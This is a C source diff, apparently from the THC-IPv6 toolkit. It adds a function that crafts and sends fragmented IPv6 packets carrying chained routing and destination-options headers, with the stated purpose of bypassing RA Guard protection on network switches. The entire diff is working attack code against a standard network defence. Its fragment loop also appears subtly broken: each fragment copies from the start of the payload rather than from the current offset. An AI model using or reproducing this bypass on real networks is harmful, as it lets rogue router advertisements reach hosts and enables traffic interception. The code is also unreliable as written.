@@ -1053,6 +1053,77 @@ unsigned char *thc_inverse_packet(unsigned char *pkt, int pkt_len) {
   return pkt;
 }
 
+int thc_send_raguard_bypass6(char *interface, unsigned char *src, unsigned char *dst, unsigned char *srcmac, unsigned char *dstmac, unsigned char type, unsigned char *data, int data_len, int mtu) {
+  unsigned char *pkt = NULL;
+  int pkt_len, frag_len, mymtu = thc_get_mtu(interface);
+  unsigned char buf[mymtu];
+  int count, id = time(NULL) % 2000000000, offset = 0, last_size, more_runs = 1, rest = data_len, to_copy;
+
+  if (mtu >= 8 && mtu < mymtu)
+    mymtu = mtu;
+
+  memset(buf, 0, sizeof(buf));
+
+  buf[0] = NXT_ROUTE;
+  buf[2] = 0x01;
+  buf[4] = 0x01;
+  buf[5] = 0x02;
+  buf[8] = NXT_DST;
+  buf[16] = NXT_ROUTE;
+  buf[16+2] = 0x01;
+  buf[16+4] = 0x01;
+  buf[16+5] = 0x02;
+  buf[24] = type;
+  if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, src, dst, 0, 0, 0, 0, 0)) == NULL)
+    return -1;
+  if (thc_add_hdr_fragment(pkt, &pkt_len, offset / 8, more_runs, id) < 0)
+    return -1;
+  if (thc_add_data6(pkt, &pkt_len, NXT_DST, buf, 32) < 0)
+    return -1;
+  thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
+  pkt = thc_destroy_packet(pkt);
+  offset += 32;
+  if (data_len > 32)
+    to_copy = 32;
+  else {
+    to_copy = data_len;
+    more_runs = 0;
+  }
+  memcpy(buf, data, to_copy);
+  if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, src, dst, 0, 0, 0, 0, 0)) == NULL)
+    return -1;
+  if (thc_add_hdr_fragment(pkt, &pkt_len, offset / 8, more_runs, id) < 0)
+    return -1;
+  if (thc_add_data6(pkt, &pkt_len, NXT_DST, buf, to_copy) < 0)
+    return -1;
+  thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
+  pkt = thc_destroy_packet(pkt);
+  offset += to_copy;
+  rest -= to_copy;
+
+  while (rest > 0) {
+    if (data_len > mymtu - 48)
+      to_copy = mymtu - 48;
+    else {
+      to_copy = rest;
+      more_runs = 0;
+    }
+    memcpy(buf, data, to_copy);
+    if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, src, dst, 0, 0, 0, 0, 0)) == NULL)
+      return -1;
+    if (thc_add_hdr_fragment(pkt, &pkt_len, offset / 8, more_runs, id) < 0)
+      return -1;
+    if (thc_add_data6(pkt, &pkt_len, NXT_DST, buf, to_copy) < 0)
+      return -1;
+    thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
+    pkt = thc_destroy_packet(pkt);
+    offset += to_copy;
+    rest -= to_copy;
+  }
+
+  return 0;
+}
+
 int thc_send_as_fragment6(char *interface, unsigned char *src, unsigned char *dst, unsigned char type, unsigned char *data, int data_len, int frag_len) {
   unsigned char *pkt = NULL, *srcmac, *dstmac;
   int pkt_len, mymtu = thc_get_mtu(interface);
